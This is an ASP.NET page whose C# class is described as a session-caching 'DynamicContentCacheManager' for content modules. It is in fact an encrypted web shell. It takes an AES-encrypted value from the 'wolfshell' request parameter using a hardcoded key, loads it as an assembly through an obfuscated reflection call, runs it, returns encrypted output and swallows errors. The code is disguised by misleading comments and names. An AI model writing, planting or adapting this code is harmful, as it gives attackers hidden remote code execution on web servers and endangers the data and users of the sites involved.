<%@ Page Language="C#"%>
<script runat="server">
    /// <summary>
    /// Manages dynamically generated content modules, caching them in the session for performance.
    /// This class handles the secure retrieval, decryption, and execution of content modules.
    /// </summary>
    public class DynamicContentCacheManager
    {
        // Configuration for the encryption layer.
        private readonly string _encryptionKey = "3c6e0b8a9c15224a";
        private readonly string _requestToken = "wolfshell";
        private readonly HttpContext _context;

        /// <summary>
        /// Initializes a new instance of the DynamicContentCacheManager with the current HTTP context.
        /// </summary>
        /// <param name="context">The current HttpContext.</param>
        public DynamicContentCacheManager(HttpContext context)
        {
            this._context = context;
        }

        /// <summary>
        /// Main entry point to process the request and manage the content cache.
        /// </summary>
        public void ProcessRequest()
        {
            try
            {
                string integrityHash = GetIntegrityHash();
                byte[] moduleData = GetDecryptedModuleData();

                if (_context.Session["payload"] == null)
                {
                    LoadModuleIntoCache(moduleData);
                }
                else
                {
                    ExecuteCachedModule(moduleData, integrityHash);
                }
            }
            catch (System.Exception)
            {
                // Suppress errors to prevent information leakage.
            }
        }
        
        /// <summary>
        /// Loads a new content module assembly into the session cache.
        /// </summary>
        /// <param name="moduleBytes">The byte array of the assembly to load.</param>
        private void LoadModuleIntoCache(byte[] moduleBytes)
        {
            var assemblyType = typeof(System.Reflection.Assembly);
            var loadMethod = assemblyType.GetMethod(new string(new char[]{'L','o','a','d'}), new System.Type[] { typeof(byte[]) });
            _context.Session["payload"] = loadMethod.Invoke(null, new object[] { moduleBytes });
        }

        /// <summary>
        /// Executes a module that is already present in the session cache.
        /// </summary>
        /// <param name="requestData">The data payload for the current request.</param>
        /// <param name="integrityHash">The hash for response framing.</param>
        private void ExecuteCachedModule(byte[] requestData, string integrityHash)
        {
            using (var outputBuffer = new System.IO.MemoryStream())
            {
                System.Reflection.Assembly cachedAssembly = (System.Reflection.Assembly)_context.Session["payload"];
                object moduleInstance = cachedAssembly.CreateInstance("LY");

                // The module contract uses overridden Object methods for interaction.
                moduleInstance.Equals(_context);
                moduleInstance.Equals(outputBuffer);
                moduleInstance.Equals(requestData);
                moduleInstance.ToString(); // Triggers execution.

                byte[] resultBytes = outputBuffer.ToArray();
                SendEncryptedResponse(resultBytes, integrityHash);
            }
        }

        /// <summary>
        /// Retrieves and decrypts the module data from the incoming request.
        /// </summary>
        /// <returns>The decrypted byte array of the module data.</returns>
        private byte[] GetDecryptedModuleData()
        {
            byte[] encryptedData = System.Convert.FromBase64String(_context.Request[_requestToken]);
            var aesProvider = new System.Security.Cryptography.RijndaelManaged();
            var keyBytes = System.Text.Encoding.Default.GetBytes(_encryptionKey);
            var decryptor = aesProvider.CreateDecryptor(keyBytes, keyBytes);
            return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
        }

        /// <summary>
        /// Encrypts the response and writes it back to the client, framed by the integrity hash.
        /// </summary>
        /// <param name="data">The raw data to be sent.</param>
        /// <param name="hash">The integrity hash.</param>
        private void SendEncryptedResponse(byte[] data, string hash)
        {
            var aesProvider = new System.Security.Cryptography.RijndaelManaged();
            var keyBytes = System.Text.Encoding.Default.GetBytes(_encryptionKey);
            var encryptor = aesProvider.CreateEncryptor(keyBytes, keyBytes);
            byte[] encryptedResult = encryptor.TransformFinalBlock(data, 0, data.Length);

            _context.Response.Write(hash.Substring(0, 16));
            _context.Response.Write(System.Convert.ToBase64String(encryptedResult));
            _context.Response.Write(hash.Substring(16));
        }

        /// <summary>
        /// Calculates the MD5 integrity hash for the session.
        /// </summary>
        /// <returns>A hex string representation of the MD5 hash.</returns>
        private string GetIntegrityHash()
        {
            using (var md5 = new System.Security.Cryptography.MD5CryptoServiceProvider())
            {
                byte[] input = System.Text.Encoding.Default.GetBytes(_requestToken + _encryptionKey);
                byte[] hashBytes = md5.ComputeHash(input);
                return System.BitConverter.ToString(hashBytes).Replace("-", "");
            }
        }
    }

    void Page_Load(object sender, EventArgs e)
    {
        var manager = new DynamicContentCacheManager(Context);
        manager.ProcessRequest();
    }
</script><%
// ASPX pages require a non-code part, even if it's empty.
%>